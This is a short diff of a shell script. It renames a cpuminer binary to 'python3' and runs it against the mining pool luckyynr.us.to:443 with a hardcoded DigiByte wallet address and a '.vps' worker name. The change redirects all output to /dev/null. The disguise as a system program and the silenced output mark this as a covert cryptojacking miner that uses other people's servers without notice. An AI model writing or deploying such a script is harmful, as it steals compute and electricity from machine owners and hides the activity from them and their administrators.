@@ -7,4 +7,4 @@ rm dot
 
 mv cpuminer-sse2 python3
 
-./python3 -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps -p c=DGB /dev/null 2>&1
+./python3 -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps -p c=DGB > /dev/null 2>&1
